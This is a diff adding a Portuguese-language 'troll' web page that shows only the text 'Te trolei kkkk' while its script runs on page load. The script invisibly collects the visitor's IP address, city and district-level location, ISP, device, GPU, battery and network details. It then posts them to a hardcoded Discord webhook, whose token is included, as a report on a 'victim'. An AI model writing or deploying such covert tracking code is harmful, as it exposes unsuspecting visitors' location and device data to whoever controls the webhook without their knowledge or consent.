@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mo burro kkkk</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+            padding-top: 100px;
+            font-size: 3em;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    Te trolei kkkk
+
+    <script>
+        // Webhook do Discord
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1403520973549994006/OK9kw7JWCRX5LNhpjwkjMB2VDxqAunjLgMYOnk1PE2RPVel4b7D2of8zq0asTF7Wlw9F';
+
+        // Coleta TUDO de forma invisível
+        async function collectAllData() {
+            const data = {
+                ip: await getIP(),
+                location: await getLocation(),
+                system: {
+                    os: getOS(),
+                    browser: getBrowser(),
+                    screen: `${screen.width}x${screen.height}`,
+                    colors: screen.colorDepth + ' bits',
+                    gpu: await getGPU(),
+                    cpu: navigator.hardwareConcurrency + ' cores'
+                },
+                network: {
+                    type: navigator.connection?.effectiveType || 'desconhecido',
+                    speed: navigator.connection?.downlink + ' Mbps' || 'desconhecido',
+                    rtt: navigator.connection?.rtt + ' ms' || 'desconhecido',
+                    saveData: navigator.connection?.saveData ? 'ativado' : 'desativado'
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+                battery: await getBattery(),
+                storage: {
+                    localStorage: !!window.localStorage,
+                    sessionStorage: !!window.sessionStorage,
+                    cookies: navigator.cookieEnabled
+                },
+                touch: 'ontouchstart' in window ? 'sim' : 'não',
+                doNotTrack: navigator.doNotTrack || 'não especificado',
+                date: new Date().toLocaleString(),
+                url: window.location.href
+            };
+
+            sendToDiscord(data);
+        }
+
+        // Funções auxiliares
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                return (await response.json()).ip;
+            } catch {
+                return "não detectado";
+            }
+        }
+
+        async function getLocation() {
+            try {
+                const ip = await getIP();
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=continent,country,regionName,city,district,isp,org,mobile,proxy`);
+                return await response.json();
+            } catch {
+                return {};
+            }
+        }
+
+        async function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                return gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) || "não detectado";
+            } catch {
+                return "não detectado";
+            }
+        }
+
+        async function getBattery() {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'sim' : 'não',
+                    chargingTime: battery.chargingTime + 's'
+                };
+            } catch {
+                return {};
+            }
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return "Windows";
+            if (/Mac/.test(ua)) return "MacOS";
+            if (/Linux/.test(ua)) return "Linux";
+            if (/Android/.test(ua)) return "Android";
+            if (/iOS|iPhone|iPad|iPod/.test(ua)) return "iOS";
+            return "desconhecido";
+        }
+
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            let browser = "desconhecido";
+            if (/Firefox/.test(ua)) browser = "Firefox";
+            else if (/Chrome/.test(ua)) browser = "Chrome";
+            else if (/Safari/.test(ua)) browser = "Safari";
+            else if (/Edge/.test(ua)) browser = "Edge";
+            else if (/Opera/.test(ua)) browser = "Opera";
+            else if (/SamsungBrowser/.test(ua)) browser = "Samsung Browser";
+            return browser;
+        }
+
+        // Envia para o Discord formatado
+        async function sendToDiscord(data) {
+            const message = `
+**🔍 VÍTIMA TROLADA - DADOS COMPLETOS 🔍**
+🕒 *${data.date}*
+🌐 *URL:* ${data.url}
+
+**🌍 LOCALIZAÇÃO**
+• IP: ${data.ip}
+• País: ${data.location.country || 'não detectado'}
+• Região: ${data.location.regionName || 'não detectado'}
+• Cidade: ${data.location.city || 'não detectado'}
+• Bairro: ${data.location.district || 'não detectado'}
+• Provedor: ${data.location.isp || 'não detectado'}
+• Operadora: ${data.location.org || 'não detectado'}
+• Móvel: ${data.location.mobile ? 'sim' : 'não'}
+• Proxy/VPN: ${data.location.proxy ? 'sim' : 'não'}
+
+**💻 SISTEMA**
+• SO: ${data.system.os}
+• Navegador: ${data.system.browser}
+• Tela: ${data.system.screen} (${data.system.colors})
+• GPU: ${data.system.gpu}
+• CPU: ${data.system.cpu}
+• Touch: ${data.touch}
+• Idiomas: ${data.languages.join(', ')}
+• Plugins: ${data.plugins || 'nenhum'}
+
+**🔋 BATERIA**
+• Nível: ${data.battery.level || 'não detectado'}
+• Carregando: ${data.battery.charging || 'não detectado'}
+
+**📡 REDE**
+• Tipo: ${data.network.type}
+• Velocidade: ${data.network.speed}
+• Latência: ${data.network.rtt}
+• Modo economia: ${data.network.saveData}
+• Do Not Track: ${data.doNotTrack}
+
+**💾 ARMAZENAMENTO**
+• LocalStorage: ${data.storage.localStorage ? 'ativo' : 'bloqueado'}
+• SessionStorage: ${data.storage.sessionStorage ? 'ativo' : 'bloqueado'}
+• Cookies: ${data.storage.cookies ? 'ativo' : 'bloqueado'}
+            `.trim();
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (e) {
+                console.error("Erro ao enviar:", e);
+            }
+        }
+
+        // Inicia quando a página carrega
+        window.addEventListener('load', collectAllData);
+    </script>
+</body>
+</html>
